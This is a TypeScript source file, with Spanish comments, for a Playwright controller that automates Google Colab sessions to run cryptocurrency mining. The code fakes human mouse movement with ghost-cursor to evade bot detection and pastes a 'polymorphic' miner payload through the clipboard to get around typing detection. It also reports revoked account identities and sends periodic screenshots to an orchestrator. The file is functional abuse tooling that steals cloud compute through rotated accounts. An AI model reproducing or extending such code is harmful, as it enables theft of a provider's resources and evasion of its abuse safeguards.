// tools/provisioner/src/lib/colab.ts
import { Page, Locator } from 'playwright';
import { createCursor, GhostCursor } from 'ghost-cursor-playwright';
import axios from 'axios';
import chalk from 'chalk';
import { config } from '../config';
import { generateMinerPayload } from './payload';
import { SELECTORS } from './selectors';

/**
 * Controlador autónomo para una instancia de Google Colab.
 * Encapsula la lógica de navegación, evasión, inyección y vigilancia.
 */
export class ColabController {
  private page: Page;
  private workerId: string;
  private prefix: string;
  private cursor: GhostCursor | null = null;
  private surveillanceInterval: NodeJS.Timeout | null = null;
  private identityEmail: string | null;

  /**
   * Inicializa el controlador del nodo.
   * @param page - Página de Playwright aislada (Contexto único).
   * @param index - Índice numérico para logs.
   * @param identityEmail - Email de la identidad inyectada (para reportes).
   */
  constructor(page: Page, index: number, identityEmail: string | null) {
    this.page = page;
    this.identityEmail = identityEmail;
    this.workerId = `hydra-node-${index}-${Date.now().toString().slice(-4)}`;
    this.prefix = chalk.cyan(`[${this.workerId}]`);
  }

  /**
   * Ejecuta la secuencia completa de despliegue.
   * Maneja errores y asegura la limpieza de recursos en caso de fallo.
   */
  async deploy(): Promise<void> {
    try {
      // 1. Inicializar Ghost Cursor (Movimiento Humano)
      this.cursor = await createCursor(this.page);

      // 2. Secuencia de Operaciones
      await this.navigate();
      await this.checkAuthWall();     // Fail-fast si pide login
      await this.connectRuntime();    // Obtener VM (GPU/CPU)
      await this.injectAndRun();      // Inyectar Payload Python

      // 3. Activar Vigilancia (Panóptico)
      this.startSurveillance();

      console.log(`${this.prefix} ${chalk.green('✅ SECUENCIA COMPLETADA. OPERATIVO.')}`);

    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      console.error(`${this.prefix} ${chalk.red('❌ FALLO CRÍTICO:')} ${msg}`);

      // Reporte forense
      await this.reportSnapshot('error');

      // Re-lanzar para que el Main Loop maneje el reintento
      throw e;
    }
  }

  /**
   * Navega a la URL objetivo con timeouts seguros.
   */
  private async navigate(): Promise<void> {
    await this.page.goto(config.COLAB_URL, {
      timeout: config.NAV_TIMEOUT,
      waitUntil: 'domcontentloaded'
    });

    // Movimiento aleatorio inicial para "calentar" la detección de bot
    if (this.cursor) {
      await this.cursor.move({
        x: Math.random() * 500 + 100,
        y: Math.random() * 500 + 100
      });
    }
  }

  /**
   * Verifica si Google ha interceptado la sesión (Login/Captcha).
   * Si detecta muro de auth, reporta la identidad como "RateLimited/Revoked".
   */
  private async checkAuthWall(): Promise<void> {
    // Usamos Promise.race para detectar cualquiera de los selectores de login rápidamente
    for (const selector of SELECTORS.SIGN_IN_BTN) {
        if (await this.page.isVisible(selector, { timeout: 1500 }).catch(() => false)) {
            console.warn(`${this.prefix} ${chalk.yellow('⚠️ AUTH WALL DETECTADO')}`);

            if (this.identityEmail) {
                await this.reportIdentityDeath(this.identityEmail);
            }
            throw new Error('AUTH_REQUIRED');
        }
    }
  }

  /**
   * Intenta conectar al Runtime usando múltiples estrategias de selectores.
   */
  private async connectRuntime(): Promise<void> {
    console.log(`${this.prefix} 🔌 Solicitando recursos de cómputo...`);

    // Estrategia "Smart Click": Intentar cada selector hasta que uno funcione
    let clicked = false;
    for (const selector of SELECTORS.CONNECT_BTN) {
        try {
            const locator = this.page.locator(selector).first();
            if (await locator.isVisible({ timeout: 1000 })) {
                if (this.cursor) await this.cursor.click(locator);
                else await locator.click();
                clicked = true;
                break;
            }
        } catch {}
    }

    if (!clicked) {
        console.log(`${this.prefix} ℹ️ No se encontró botón 'Connect'. Asumiendo auto-conexión o UI cambiada.`);
    }

    // Esperar confirmación visual (Barra de RAM/Disco)
    try {
        await this.page.waitForSelector(SELECTORS.RAM_DISK_BAR, { timeout: 30000 });
        console.log(`${this.prefix} ⚡ VM Asignada y Activa.`);
    } catch {
        console.warn(`${this.prefix} ⚠️ Timeout esperando confirmación de VM. Continuando bajo riesgo.`);
    }
  }

  /**
   * Inyecta el payload de minería en la celda de código y lo ejecuta.
   */
  private async injectAndRun(): Promise<void> {
    console.log(`${this.prefix} 💉 Inyectando payload polimórfico...`);

    // 1. Enfocar Editor
    const editor = this.page.locator(SELECTORS.EDITOR_LINE).first();
    await editor.waitFor({ state: 'visible', timeout: 10000 });

    if (this.cursor) await this.cursor.click(editor);
    else await editor.click();

    // 2. Limpieza (Ctrl+A -> Delete)
    await this.page.keyboard.down('Control');
    await this.page.keyboard.press('A');
    await this.page.keyboard.up('Control');
    await this.page.keyboard.press('Backspace');

    // 3. Inyección Clipboard (Bypass de detección de tipeo robótico)
    const payload = generateMinerPayload(this.workerId);
    await this.page.evaluate((text) => navigator.clipboard.writeText(text), payload);

    await this.page.keyboard.down('Control');
    await this.page.keyboard.press('V');
    await this.page.keyboard.up('Control');

    // 4. Ejecución (Ctrl+Enter)
    await this.page.waitForTimeout(800); // Pausa humana
    await this.page.keyboard.down('Control');
    await this.page.keyboard.press('Enter');
    await this.page.keyboard.up('Control');
  }

  // --- MÉTODOS DE SOPORTE & TELEMETRÍA ---

  /**
   * Reporta al Orquestador que una identidad ha muerto o requiere verificación.
   */
  private async reportIdentityDeath(email: string): Promise<void> {
      if (!config.ORCHESTRATOR_URL) return;
      try {
          console.log(`${this.prefix} 💀 Reportando muerte de identidad: ${email}`);
          await axios.post(
              `${config.ORCHESTRATOR_URL}/api/v1/admin/identities/revoke`,
              { email },
              { headers: { 'Authorization': `Bearer ${config.WORKER_AUTH_TOKEN}` } }
          );
      } catch (e: any) {
          console.error(`${this.prefix} Fallo al reportar muerte: ${e.message}`);
      }
  }

  /**
   * Inicia el ciclo de vigilancia visual (Screenshots periódicos).
   */
  private startSurveillance(): void {
    if (this.surveillanceInterval) clearInterval(this.surveillanceInterval);
    // Intervalo de 30s para no saturar ancho de banda
    this.surveillanceInterval = setInterval(() => this.reportSnapshot('running'), 30000);
  }

  /**
   * Captura y envía una instantánea del estado visual del worker.
   */
  private async reportSnapshot(status: 'running' | 'error' | 'captcha'): Promise<void> {
    if (!config.ORCHESTRATOR_URL) return;
    try {
        // Calidad baja (20%) y formato JPEG para minimizar payload
        const buffer = await this.page.screenshot({ quality: 20, type: 'jpeg' });
        const base64 = `data:image/jpeg;base64,${buffer.toString('base64')}`;

        await axios.post(
            `${config.ORCHESTRATOR_URL}/api/v1/admin/worker-snapshot`,
            {
                worker_id: this.workerId,
                status,
                snapshot_base64: base64,
                timestamp: new Date().toISOString()
            },
            {
                headers: { 'Authorization': `Bearer ${config.WORKER_AUTH_TOKEN}` },
                timeout: 5000
            }
        );
    } catch (e: any) {
        // Fallos de snapshot son no-críticos, solo logueamos
        // console.warn(`${this.prefix} Fallo envío snapshot: ${e.message}`);
    }
  }
}
